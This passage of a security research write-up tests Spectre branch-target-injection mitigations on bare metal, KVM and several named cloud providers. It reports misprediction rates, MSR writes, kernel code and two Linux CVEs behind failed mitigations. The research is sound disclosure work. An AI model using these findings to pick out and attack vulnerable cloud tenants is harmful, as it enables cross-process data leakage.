+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>real	0m0,695s
+</span></span><span style=display:flex><span>user	0m0,174s
+</span></span><span style=display:flex><span>sys	0m0,000s
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Testing victim on core 4: 
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Rate: 1000/1000  MSR[72]=0
+</span></span><span style=display:flex><span>Total mispredict rate: 10000/10000 (100.00 %)
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>real	0m0,744s
+</span></span><span style=display:flex><span>user	0m0,235s
+</span></span><span style=display:flex><span>sys	0m0,000s
+</span></span></code></pre></div><p>In this case, we observed a misprediction rate of 95%+, indicating that the attacker process can poison the victim branch.</p><p>Disabling the (in this case, the control, it was already disabled) mitigations using the MSR (obviously) returns similar results:</p><pre tabindex=0><code>Testing victim-nospecctrl on core 0: 
+current value msr[72]=0 on core 0
+writing msr[72]=0 on core 0 
+current value msr[72]=0 on core 0
+Rate: 1000/1000  MSR[72]=0
+[...]
+Total misspredict rate: 9999/10000 (99.99 %)
+current value msr[72]=0 on core 0
+real	0m0,691s
+user	0m0,168s
+sys	0m0,000s
+
+Testing victim-nospecctrl on core 4: 
+current value msr[72]=0 on core 4
+writing msr[72]=0 on core 4 
+current value msr[72]=0 on core 4
+Rate: 998/1000  MSR[72]=0
+[...]
+Total misspredict rate: 9988/10000 (99.88 %)
+current value msr[72]=0 on core 4
+
+real	0m0,746s
+user	0m0,234s
+sys	0m0,000s
+</code></pre><h3 id=ibrs>IBRS</h3><p>By using the msr-tools, we are able to write to the IA32_SPEC_CTRL MSR by writing to the file <code>/dev/cpu/&lt;cpu>/msr</code>. We have used Haswell CPU for the control test, in which by setting IBRS=1 mitigates all different spectre-BTI scenarios:</p><pre tabindex=0><code>Testing victim-IBRS on core 0: 
+current value msr[72]=0 on core 0
+writing msr[72]=1 on core 0 
+current value msr[72]=1 on core 0
+[...]
+Total misspredict rate: 0/10000 (0.00 %)
+current value msr[72]=1 on core 0
+
+real	0m1,713s
+user	0m0,731s
+sys	0m0,094s
+
+Testing victim-IBRS on core 4: 
+current value msr[72]=0 on core 4
+writing msr[72]=1 on core 4 
+current value msr[72]=1 on core 4
+[...]
+Total mispredict rate: 0/10000 (0.00 %)
+current value msr[72]=1 on core 4
+
+real	0m1,536s
+user	0m0,984s
+sys	0m0,037s
+</code></pre><p>For the IBRS tests, it&rsquo;s also possible to note a drastic performance decrease, from ~0.7s to ~1.5 seconds for both CPU threads; this indicates that probably speculative execution is disabled when IBRS is enabled. Commenting the line that flushes the target value for the branch improves the result, implying that the CPU spent less time on stalls in the pipeline:</p><pre tabindex=0><code>$ time sudo ./victim-IBRS 0x55555554123 0x55555555345 4
+[...]
+Total misspredict rate: 0/10000 (0.00 %)
+current value msr[72]=0 on core 4
+
+real    0m1,050s
+user    0m0,005s
+sys     0m0,005s
+</code></pre><h3 id=stibp>STIBP</h3><p>STIBP aims to mitigate only speculation between sibling threads so it&rsquo;s expected to not mitigate attacks running on the same core:</p><pre tabindex=0><code>Testing victim-STIBP on core 0: 
+current value msr[72]=1 on core 0
+writing msr[72]=2 on core 0 
+current value msr[72]=2 on core 0
+[...]
+Total misspredict rate: 6198/10000 (61.98 %)
+current value msr[72]=2 on core 0
+
+real	0m1,102s
+user	0m0,434s
+sys	0m0,000s
+
+Testing victim-STIBP on core 4: 
+current value msr[72]=0 on core 4
+writing msr[72]=2 on core 4 
+current value msr[72]=2 on core 4
+[...]
+Total misspredict rate: 0/10000 (0.00 %)
+current value msr[72]=2 on core 4
+
+real	0m0,744s
+user	0m0,227s
+sys	0m0,006s
+</code></pre><h3 id=ibpb>IBPB</h3><p>In our tests with IBPB, before every sequence of 100 branches an IBPB is issued.</p><pre tabindex=0><code>Testing victim-IBPB on core 0: 
+current value msr[72]=2 on core 0
+writing msr[72]=0 on core 0 
+current value msr[72]=0 on core 0
+[...]
+Total misspredict rate: 0/10000 (0.00 %)
+current value msr[72]=0 on core 0
+
+real	0m0,784s
+user	0m0,259s
+sys	0m0,000s
+
+Testing victim-IBPB on core 4: 
+current value msr[72]=2 on core 4
+writing msr[72]=0 on core 4 
+current value msr[72]=0 on core 4
+[...]
+Total misspredict rate: 14/10000 (0.14 %)
+current value msr[72]=0 on core 4
+
+real	0m0,838s
+user	0m0,248s
+sys	0m0,074s
+</code></pre><p>In the SMT scenario, it&rsquo;s possible to observe some traces of speculation happening. This result is expected since after the flush of the BPU, thread 0 immediately executes a branch poisoning the BTB. However, due to the high frequency of IBPB’s in this test, it drastically reduces the speculation rate on the sibling thread. The Linux Kernel, when mitigating user-user branch injection attacks, only issues the IBPB on context switches and the sibling thread case is mitigated by STIBP (as recommended by Intel). Since we did not ensure such rigorous execution flow control when testing on usermode (we could have added synchronization but it was really not necessary for what we wanted to test), it&rsquo;s not possible to be sure that an attacker thread wouldn&rsquo;t be scheduled between a victim IBPB and a victim branch so this test may lead to some false positives, however, the results seem accurate enough.</p><h3 id=prctl>PRCTL</h3><p>As previously mentioned, the PRCTL syscall allows setting the speculative control for a given process <sup id=fnref1:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>. The following call can be used to mitigate spectre-BTI attacks against an user process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=display:flex><span><span style=color:#a6e22e>prctl</span>(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
+</span></span></code></pre></div><p>The Linux kernel uses a combination of the previous hardware mitigations (STIBP+IBPB) to protect the process from spectre-BTI attacks. This is expected to fully protect the victim:</p><pre tabindex=0><code>Testing victim-PRCTL on core 0: 
+PRCTL GET value 0x9
+Rate: 0/1000  MSR[72]=2
+[...]
+Rate: 0/1000  MSR[72]=2
+Total misspredict rate: 0/10000 (0.00 %)
+
+real	0m0,744s
+user	0m0,200s
+sys	0m0,022s
+
+Testing victim-PRCTL on core 4: 
+PRCTL GET value 0x9
+Rate: 0/1000  MSR[72]=2
+[...]
+Rate: 0/1000  MSR[72]=2
+Total misspredict rate: 0/10000 (0.00 %)
+
+real	0m0,744s
+user	0m0,222s
+sys	0m0,013s
+</code></pre><h3 id=conclusion-table>Conclusion Table:</h3><p>Ubuntu 22.04.1 LTS:</p><p>Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</p><p>CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz</p><h4 id=results-for-control-test-setup-bare-metal>Results for Control Test Setup (Bare Metal):</h4><table><thead><tr><th>Mitigation</th><th>Same Core</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.99 %</td><td>99.88 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>61.98 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.00 %</td><td>0.14 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr></tbody></table><h4 id=cve-2023-0045-bypassing-spectre-bti-user-space-mitigations-on-linux-15>CVE 2023-0045 Bypassing Spectre-BTI User Space Mitigations on Linux <sup id=fnref:15><a href=#fn:15 class=footnote-ref role=doc-noteref>15</a></sup></h4><p>In some tests it was detected traces of speculative execution when using PRCTL as mitigation and seting the attacker on the same core. Further research explaned this behaviour due a Kernel bug. Previous implementation of the mitigation only marks the process as protected and dont issue the IBPB during the syscall. this leaves the process unprotected until the next schedule, thus allowing the process to execute for a short period using values already present on the BTB.</p><h2 id=tests-on-kvm>Tests on KVM</h2><p>In the same Bare Metal machine, we set up a KVM virtual machine with an ubuntu 22.04.5 image:</p><pre tabindex=0><code>$ virt-install -n ubuntu22 --ram=1024 --vcpus=2 --disk bus=virtio,size=10 --graphics none --location=/var/lib/libvirt/images/ubuntu-22.04.1-live-server-amd64.iso --extra-args=&#39;console=ttyS0&#39;
+
+//The 2 vcpus are pinned to siblings on the host machine:
+$ virsh vcpuinfo ubuntutest22
+VCPU:           0
+CPU:            0
+State:          running
+CPU time:       17,9s
+CPU Affinity:   y-------
+VCPU:           1
+CPU:            4
+State:          running
+CPU time:       11,9s
+CPU Affinity:   ----y---
+</code></pre><p>The spectre-meltdown checker output:</p><pre tabindex=0><code>Checking for vulnerabilities on current system
+Kernel is Linux 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
+CPU is Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
+    [...]
+    
+CVE-2017-5715 aka &#39;Spectre Variant 2, branch target injection&#39;
+* Mitigated according to the /sys interface:  YES  (Mitigation: Retpolines, IBPB: conditional, IBRS_FW, STIBP: disabled, RSB filling, PBRSB-eIBRS: Not affected)
+* Mitigation 1
+  * Kernel is compiled with IBRS support:  YES
+    * IBRS enabled and active:  YES  (for firmware code only)
+  * Kernel is compiled with IBPB support:  YES
+    * IBPB enabled and active:  YES
+* Mitigation 2
+  * Kernel has branch predictor hardening (arm):  NO
+  * Kernel compiled with retpoline option:  YES
+    * Kernel compiled with a retpoline-aware compiler:  YES  (kernel reports full retpoline compilation)
+&gt; STATUS:  NOT VULNERABLE  (Full retpoline + IBPB are mitigating the vulnerability)
+</code></pre><h4 id=results-for-baremetal-kvm>Results for baremetal-kvm:</h4><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.95 %</td><td>99.99 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.98 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.00 %</td><td>98.68 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.01 %</td><td>99.98 %</td><td>No</td></tr></tbody></table><p>The tests showed something unexpected: all mitigations worked properly when tested individually, but the prctl is not setting the STIBP MSR like it does when executed in the host, leaving it vulnerable to SMT attacks:</p><pre tabindex=0><code>Testing victim-STIBP on core 1:
+current value msr[72]=1 on core 1
+writing msr[72]=2 on core 1
+current value msr[72]=2 on core 1
+Rate: 1/1000  MSR[72]=2    -&gt; CVE 2023-0045 trace
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+Rate: 0/1000  MSR[72]=2
+
+Total misspredict rate: 1/10000 (0.01 %)
+current value msr[72]=2 on core 1
+[...]
+
+Testing victim-PRCTL on core 1:
+PRCTL GET value 0x9
+Rate: 1000/1000  MSR[72]=0
+Rate: 999/1000   MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 999/1000   MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+Rate: 1000/1000  MSR[72]=0
+
+Total misspredict rate: 9998/10000 (99.98 %)
+</code></pre><p><strong>The PRCTL syscall on this kernel fails to mitigate SMT BTI attacks inside the default KVM</strong>. Further investigation showed that in this case, besides KVM allowing proper MSR writes, the Linux kernel only implements the STIBP mitigation if the processor is executing in SMT (which makes sense on a Bare Metal system):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> __always_inline <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>__speculation_ctrl_update</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> tifp,
+</span></span><span style=display:flex><span>						      <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> tifn)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	[...]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>/* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */</span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>IS_ENABLED</span>(CONFIG_SMP) <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>	    <span style=color:#a6e22e>static_branch_unlikely</span>(<span style=color:#f92672>&amp;</span>switch_to_cond_stibp)) {
+</span></span><span style=display:flex><span>		updmsr <span style=color:#f92672>|=</span> <span style=color:#f92672>!!</span>(tif_diff <span style=color:#f92672>&amp;</span> _TIF_SPEC_IB);
+</span></span><span style=display:flex><span>		msr <span style=color:#f92672>|=</span> <span style=color:#a6e22e>stibp_tif_to_spec_ctrl</span>(tifn);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (updmsr)
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>write_spec_ctrl_current</span>(msr, false);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Even though both cores are siblings on the host, the guest OS believes they are not siblings (due to how the hypervisor exposes the hardware) and therefore STIBP is not necessary. This explains why MSR[72]=0 during the prctl mitigation. Reading <code>/sys/devices/system/cpu/cpu0/topology/thread_siblings_list</code> on guest shows that there is only one sibling core:</p><p><code>0</code></p><p>versus 2 on the guest:</p><p><code>0,4</code></p><h2 id=tests-on-google-cloud>Tests on google cloud</h2><h4 id=results-for-gcp-n1-standard-2-intel_haswell>Results for gcp-n1-standard-2-Intel_Haswell:</h4><p>Google cloud shows that mitigations are available for spectre-BTI:</p><pre tabindex=0><code>Checking for vulnerabilities on current system
+Kernel is Linux 5.15.0-1025-gcp #32-Ubuntu SMP Wed Nov 23 21:46:01 UTC 2022 x86_64
+CPU is Intel(R) Xeon(R) CPU @ 2.30GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates IBRS capability:  YES  (SPEC_CTRL feature bit)
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability:  YES  (SPEC_CTRL feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available:  YES
+    * CPU indicates STIBP capability:  YES  (Intel STIBP feature bit)
+</code></pre><p>Google cloud output shows some different results than the ones observed in bare metal and KVM: It&rsquo;s never possible to write another value other than 1 to IA32_SPEC_CTRL.</p><pre tabindex=0><code>Testing victim-nospecctrl on core 0: 
+current value msr[72]=1 on core 0
+writing msr[72]=0 on core 0 
+current value msr[72]=1 on core 0
+[...]
+Rate: 1000/1000  MSR[72]=1
+Total misspredict rate: 9979/10000 (99.79 %)
+current value msr[72]=1 on core 0
+
+real	0m0.879s
+user	0m0.267s
+sys	0m0.082s
+</code></pre><p>This behavior is odd. Because the IA32_SPEC_CTRL is set (IBRS), but speculation still happens, and there isn&rsquo;t an overhead associated with disabling the speculation:</p><pre tabindex=0><code>Testing victim-IBRS on core 0: 
+current value msr[72]=1 on core 0
+writing msr[72]=1 on core 0 
+current value msr[72]=1 on core 0
+Rate: 995/1000  MSR[72]=1
+[...]
+Total misspredict rate: 9945/10000 (99.45 %)
+current value msr[72]=1 on core 0
+
+real	0m0.877s
+user	0m0.332s
+sys	0m0.017s
+</code></pre><p>The time here for finishing the task is 0.877s, similar to the 0.7s on bare metal and shorter than the 1.5s for IBRS on bare metal, with Haswell CPUs. That might indicate that the hypervisor is reporting a value that is not really set in the MSR.</p><p>Since it´s not possible to enable STIBP, PRCTL is expected to fail on the sibling attack, even if prctl doesn&rsquo;t throw an error:</p><pre tabindex=0><code>Testing victim-PRCTL on core 1: 
+PRCTL GET value 0x9
+[...]
+Total misspredict rate: 9920/10000 (99.20 %)
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.79 %</td><td>99.90 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>99.45 %</td><td>0.01 % (1)</td><td>No</td></tr><tr><td>STIBP</td><td>90.47 %</td><td>87.62 %</td><td>No</td></tr><tr><td>IBPB</td><td>99.78 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.00 %</td><td>97.57 %</td><td>No</td></tr></tbody></table><p>(1) This result might be a false negative, since repeating the experiment shows higher speculation rates as observed in the data collected.</p><p><strong>The results show that the only effective mitigation in this machine is IBPB and that the PRCTL-based mitigation is ineffective due to lack of STIBP.</strong></p><h4 id=results-for-gcp-debian-10-haswell>Results for gcp-debian-10-haswell:</h4><p>We had a surprise though when after starting a Debian 10 machine in the same processor consistently allowed for an MSR write on the IA32_SPEC_CTRL register:</p><pre tabindex=0><code>Checking for vulnerabilities on current system
+Kernel is Linux 4.19.0-22-cloud-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64
+CPU is Intel(R) Xeon(R) CPU @ 2.30GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available: YES 
+    * CPU indicates IBRS capability: YES  (SPEC_CTRL feature bit)
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability: YES (SPEC_CTRL feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available:  YES 
+    * CPU indicates STIBP capability:  YES (Intel STIBP feature bit)
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.81 %</td><td>93.45 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.01 %</td><td>00.03 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.63 %</td><td>0.02 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>0.02 %</td><td>86.21 %</td><td>Yes</td></tr><tr><td>PRCTL</td><td>0.02 %</td><td>0.04 % (1)</td><td>Yes</td></tr></tbody></table><p>(1) It is possible to see that the speculation rate is different than zero, but it is unclear if it&rsquo;s measurement noise or an actual vulnerability as will be discussed later.</p><p>Obviously just changing the OS should not give different MSR values, since it is highly unlikely that the hypervisor would show a different behavior based on the OS (kernel). Our first guess was that when choosing a different OS we were getting into a different pool of machines. But that also seemed unlikely. We have decided to then upgrade the older system kernel, and oddly, saw the previous behavior again (but now we were certain we were in the same machine since the reboot was too fast for us to have had a live migration). Our next theory was that the different kernels were using different mitigation strategies (IBRS versus IBPB with STIBP). By starting the new upgraded system with ‘mitigations=off’ kernel parameter, we’ve noticed that we were now able again to write in the MSRs. We then tested the other machine, and indeed, with</p><p>‘mitigations=off’, we were able to write to the MSRs.</p><p>Further investigation showed this behaviour was caused by a kernel bug as described by CVE 2023-1998.</p><h4 id=cve-2023-1998-spectre-v2-smt-mitigations-problem-16>CVE 2023-1998: Spectre v2 SMT mitigations problem <sup id=fnref:16><a href=#fn:16 class=footnote-ref role=doc-noteref>16</a></sup></h4><p>Later research explains this behaviour due a bug in the Linux Kernel that prevents the guest to properly select STIBP as a mitigation when IBRS is choosed to protect the Kernel. The Bare metal haswell reports the cpu not being vulnerable to RETBLEED, but the CPU on google cloud reports RETBLEED as one of its bugs.</p><p>oxigenio2-result.txt:</p><p>bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit srbds mmio_unknown</p><p>gcp-n1-standard-2-intel_Haswell-result.txt</p><p>bugs: cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs mmio_stale_data retbleed</p><p>This forces the CPU on google cloud to choose IBRS as mitigation for the kernel. The bug lies in the logic of mitigation selection (<a href=https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196%29>https://elixir.bootlin.com/linux/v6.2/source/arch/x86/kernel/cpu/bugs.c#L1196)</a>. The comments state that if the CPU is using IBRS, STIBP is not necessary wich is wrong, this is only valid for eIBRS.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.c data-lang=.c><span style=display:flex><span> <span style=color:#75715e>/* 
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  * If no STIBP, IBRS or enhanced IBRS is enabled, or SMT impossible,
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  * STIBP is not required.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>boot_cpu_has</span>(X86_FEATURE_STIBP) <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>!</span>smt_possible <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>spectre_v2_in_ibrs_mode</span>(spectre_v2_enabled))
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>;
+</span></span></code></pre></div><p>This explains why every read is 1 on google cloud guests and the mitigation is broken, since the read is done by msr kernel driver wich is set to IBRS on kernel entry and clear the SPEC_CTRL MSR on kernel exit, leaving the victim exposed to SMT attacks. It also explains why setting ‘mitigations=off’ allows the direct mitigation usign the msr module, since the SPEC_CTRL MSR is no longer modied when transitioning between kernel and user mode.</p><h2 id=tests-on-aws-ec2>Tests on AWS EC2</h2><p>The AWS EC2 instances don&rsquo;t enumerate hardware mitigations, leading to SPEC_CTRL MSR being always 0 and IBPB not working:</p><h4 id=results-for-aws-t2medium>Results for aws-t2.medium:</h4><pre tabindex=0><code>Checking for vulnerabilities on current system
+Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
+CPU is Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available: YES
+    * CPU indicates IBRS capability: NO
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability: NO
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available: YES
+    * CPU indicates STIBP capability: NO
+[...]
+
+Testing victim-PRCTL on core 0: 
+prctl: Operation not permitted
+PRCTL GET value 0x2
+Rate: 999/1000  MSR[72]=0
+[...]
+
+Rate: 1000/1000  MSR[72]=0
+Total misspredict rate: 9995/10000 (99.95 %)
+
+real	0m1.827s
+user	0m0.328s
+sys	0m0.000s
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>99.86 %</td><td>0.09 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>99.79 %</td><td>0.06 %</td><td>Yes</td></tr><tr><td>STIBP</td><td>99.89 %</td><td>0.11 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>36.82 %</td><td>0.05 %</td><td>No</td></tr><tr><td>PRCTL</td><td>99.95 %</td><td>0.10 %</td><td>No</td></tr></tbody></table><p>Since the enumeration using CPUID doesn&rsquo;t show support for IBPB, the prctl syscall fails and no mitigations are applied. A similar result can be found for t3 instances.</p><h4 id=results-for-aws-t3anano>Results for aws-t3a.nano:</h4><p>EC2 t3a instances use AMD processors, showing that this problem is not exclusive to Intel processors. In the t3a instances tested it isn&rsquo;t possible to read or write to the MSRs, and prctl also fails with <code>operation not permitted</code> error.</p><pre tabindex=0><code>Kernel is Linux 5.15.0-1026-aws #30-Ubuntu SMP Wed Nov 23 14:15:21 UTC 2022 x86_64
+CPU is AMD EPYC 7571
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available:  NO
+    * CPU indicates IBRS capability:  NO 
+    * CPU indicates preferring IBRS always-on:  NO 
+    * CPU indicates preferring IBRS over retpoline: NO 
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability:  NO 
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>76.58 %</td><td>99.87 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>57.67 %</td><td>99.87 %</td><td>No</td></tr><tr><td>STIBP</td><td>28.44 %</td><td>99.92 %</td><td>No</td></tr><tr><td>IBPB</td><td>75.19 %</td><td>99.84 %</td><td>No</td></tr><tr><td>PRCTL</td><td>73.91 %</td><td>99.85 %</td><td>No</td></tr></tbody></table><h2 id=tests-on-azure>Tests on Azure</h2><h4 id=results-for-azure-d2sv3>Results for azure-d2sv3:</h4><p>The results for this machine are similar to the t3a instance. It&rsquo;s impossible to read or write from any SPEC_CTRL MSRs and all scenarios are vulnerable, even though it&rsquo;s a Haswell CPU.</p><h4 id=results-for-azure-ubuntu22-f2s-v2>Results for azure-ubuntu22-F2s-v2:</h4><p>This machine contains a Xeon(R) Platinum 8272CL (Cascade Lake). Our tests show that Cascade Lake CPUs are highly resilient against SMT attacks. IBPB can’t be used on this VM, it&rsquo;s not possible to read or write from SPEC_CTRL MSR and prctl fails. Given the tests show the system is not vulnerable, we conclude that the hardware mitigation is forced-enabled.</p><pre tabindex=0><code>Checking for vulnerabilities on current system
+Kernel is Linux 5.15.0-1029-azure #36-Ubuntu SMP Mon Dec 5 19:31:08 UTC 2022 x86_64
+CPU is Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available: NO 
+    * CPU indicates IBRS capability: NO 
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability: NO 
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available: NO 
+    * CPU indicates STIBP capability: NO 
+</code></pre><table><thead><tr><th>Mitigation</th><th>NOSMT</th><th>SMT</th><th>Expected?</th></tr></thead><tbody><tr><td>No mitigation</td><td>98.81 %</td><td>0.01 %</td><td>Yes</td></tr><tr><td>IBRS</td><td>0.00 %</td><td>0.01 %</td><td>No (1)</td></tr><tr><td>STIBP</td><td>99.94 %</td><td>0.00 %</td><td>Yes</td></tr><tr><td>IBPB</td><td>99.94 %</td><td>0.01 %</td><td>No</td></tr><tr><td>PRCTL</td><td>99.90 %</td><td>0.00 %</td><td>No</td></tr></tbody></table><p>(1) But not vulnerable, so we assume forced enabled</p><h2 id=tests-on-oracle-cloud>Tests on Oracle Cloud</h2><p>Intel CPUs tested on Oracle Cloud work as expected, but the AMD CPU tested only enumerates the IBPB mitigation, leaving sibling thread attacks exposed. Since the PRCTL can execute IBPB, the syscall succeeds, but it&rsquo;s not enough to protect the process.</p><pre tabindex=0><code>Kernel is Linux 5.15.0-1021-oracle #27-Ubuntu SMP Fri Oct 14 20:04:26 UTC 2022 x86_64
+CPU is AMD EPYC 7551 32-Core Processor
+
+Hardware check
+* Hardware support (CPU microcode) for mitigation techniques
+  * Indirect Branch Restricted Speculation (IBRS)
+    * SPEC_CTRL MSR is available: NO
+    * CPU indicates IBRS capability: NO 
+    * CPU indicates preferring IBRS always-on: NO 
+    * CPU indicates preferring IBRS over retpoline: NO 
+  * Indirect Branch Prediction Barrier (IBPB)
+    * CPU indicates IBPB capability: YES (IBPB_SUPPORT feature bit)
+  * Single Thread Indirect Branch Predictors (STIBP)
+    * SPEC_CTRL MSR is available: NO 
+    * CPU indicates STIBP capability: NO 
+    
+Testing victim-PRCTL on core 1: 
+PRCTL GET value 0x9
+rdmsr: CPU 1 cannot read reg 72
+Rate: 1000/1000  MSR[72]=-1
+[...]
